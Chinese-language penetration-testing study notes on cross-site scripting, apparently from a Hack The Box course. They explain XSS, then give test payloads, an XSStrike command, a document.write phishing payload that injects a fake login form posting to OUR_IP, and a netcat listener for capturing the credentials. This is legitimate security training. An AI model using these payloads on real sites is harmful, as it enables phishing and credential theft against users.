# XSS

<details>

<summary>什麼是XSS</summary>

典型的 Web 應用程式透過從後端伺服器接收 HTML 程式碼並將其呈現在客戶端網路瀏覽器上來運作。當存在漏洞的 Web 應用程式未能正確清理使用者輸入時，惡意使用者可以在輸入欄位（例如評論/回應）中註入額外的 JavaScript 程式碼，因此一旦其他使用者查看同一頁面，他們就會在不知情的情況下執行惡意 JavaScript 程式碼。



XSS 漏洞僅在客戶端執行，因此不會直接影響後端伺服器。它們只能影響執行漏洞的使用者。 XSS 漏洞對後端伺服器的直接影響可能相對較低，但它們在 Web 應用程式中非常常見，因此這相當於中等風險（`low impact + high probability = medium risk`），我們應該始終嘗試`reduce`透過偵測、修復和主動預防這些類型的漏洞來降低風險。

\
由於 XSS 攻擊在瀏覽器內執行 JavaScript 程式碼，因此它們僅限於瀏覽器的 JS 引擎（即 Chrome 中的 V8）。它們無法執行系統範圍的 JavaScript 程式碼來執行類似系統層級程式碼執行的操作。在現代瀏覽器中，它們也被限制在易受攻擊的網站的同一網域內。儘管如此，如上所述，能夠在使用者瀏覽器中執行 JavaScript 仍然可能導致各種各樣的攻擊。除此之外，如果熟練的研究人員發現 Web 瀏覽器中存在二進位漏洞（例如 Chrome 中的堆溢出），他們可以利用 XSS 漏洞在目標瀏覽器上執行 JavaScript 漏洞，最終突破瀏覽器的沙盒並在使用者的機器上執行程式碼。



幾乎所有現代 Web 應用程式中都可能發現 XSS 漏洞，並且在過去二十年中一直被積極利用。一個著名的 XSS 範例是[Samy Worm](https://en.wikipedia.org/wiki/Samy_\(computer_worm\)) ，它是一種基於瀏覽器的蠕蟲，利用了 2005 年社交網站 MySpace 中的儲存型 XSS 漏洞。訊息本身也包含相同的 JavaScript 負載，以便在其他人查看時重新發布相同的訊息。一天之內，有超過一百萬的 MySpace 用戶在他們的頁面上發布了這則訊息。儘管這個特定的負載沒有造成任何實際危害，但該漏洞可能被用於更邪惡的目的，例如竊取用戶的信用卡資訊、在瀏覽器上安裝鍵盤記錄器，甚至利用用戶網絡瀏覽器中的二進制漏洞（這在當時的網絡瀏覽器中更為常見）。



時至今日，即使是最著名的 Web 應用程式也存在可被利用的 XSS 漏洞。就連Google的搜尋引擎頁面，其搜尋欄也存在多個XSS漏洞，最近的一次是在[2019年](https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/)，XML庫中發現了一個XSS漏洞。此外，網路上最常使用的 Web 伺服器 Apache 伺服器曾被揭露有[XSS 漏洞](https://blogs.apache.org/infra/entry/apache_org_04_09_2010)，有人正積極利用該漏洞竊取某些公司的使用者密碼。所有這些都告訴我們，應該認真對待 XSS 漏洞，並投入大量精力去檢測和預防它們。

</details>

## <mark style="color:red;">**1.發現點**</mark>&#x20;

**評論區、搜尋框、URL參數、HTTP標頭等 (Something you input that will show out! )**&#x20;

## <mark style="color:red;">**2.測試Payload**</mark>

```
">
<script>alert(document.cookie)</script>
<img src="" onerror=alert(window.origin)>
```

## <mark style="color:red;">**3.bypass技巧**</mark>

```sh
python xsstrike.py -u "http://SERVER_IP:PORT/index.php?task=test" 
```

## <mark style="color:red;">4.濫用</mark>

網路釣魚 ,會話劫持&#x20;

### <mark style="color:red;">5. Manual Discovery  手動發現</mark>

當涉及手動 XSS 發現時，尋找 XSS 漏洞的難度取決於 Web 應用程式的安全性等級。通常可以透過測試各種 XSS 負載來發現基本的 XSS 漏洞，但識別進階 XSS 漏洞需要高階程式碼審查技能。

尋找 XSS 漏洞的最基本方法是針對給定網頁中的輸入欄位手動測試各種 XSS 負載。我們可以在網路上找到大量的 XSS 負載列表，例如[PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md)上的列表或[PayloadBox](https://github.com/payloadbox/xss-payload-list)中的列表。然後，我們可以開始逐一測試這些有效載荷，方法是複製每個有效載荷並將其添加到我們的表單中，並查看是否會彈出警告框。\
檢測 XSS 漏洞最可靠的方法是手動程式碼審查，它應該涵蓋後端和前端程式碼。如果我們準確地了解我們的輸入是如何被處理的，直到它到達網頁瀏覽器，我們就可以編寫一個可以高度自信地工作的自訂有效負載。

對於更常見的 Web 應用程序，我們不太可能透過有效載荷清單或 XSS 工具發現任何 XSS 漏洞。這是因為此類 Web 應用程式的開發人員可能會透過漏洞評估工具運行他們的應用程序，然後在發布之前修補任何已發現的漏洞。對於這種情況，手動程式碼審查可能會發現未被發現的 XSS 漏洞，這些漏洞可能會在常見的 Web 應用程式的公開發布後繼續存在。這些也是超出了本模組範圍的先進技術。不過，如果您有興趣學習它們，[安全編碼 101：JavaScript](https://academy.hackthebox.com/course/preview/secure-coding-101-javascript)和[白盒滲透測試 101：命令注入](https://academy.hackthebox.com/course/preview/whitebox-pentesting-101-command-injection)模組會全面涵蓋這個主題。

## <mark style="color:red;">6.網路釣魚</mark>

接下來，我們應該準備我們的 XSS 程式碼並在易受攻擊的表單上進行測試。要將 HTML 程式碼寫入易受攻擊的頁面，我們可以使用 JavaScript 函數`document.write()` ，並在我們之前在 XSS 發現步驟中找到的 XSS 負載中使用它。一旦我們將 HTML 程式碼精簡為一行並將其添加到`write`函數中，最終的 JavaScript 程式碼應如下所示：



```javascript
document.write('<h3>Please login to continue</h3><form action=http://OUR_IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

<mark style="color:red;">7.憑證竊取</mark>\



```
PikachuN@htb[/htb]$ sudo nc -lvnp 80
```

```shell-session
listening on [any] 80 ...
```

現在，讓我們嘗試使用憑證`test:test` ，並檢查我們得到的`netcat`輸出（ `don't forget to replace OUR_IP in the XSS payload with your actual IP` ）：

<mark style="color:red;">8.Skills Assessment</mark>\
\
[https://academy.hackthebox.com/module/103/section/1011](https://academy.hackthebox.com/module/103/section/1011)
----------------------------------------------------------------------------------------------------------------
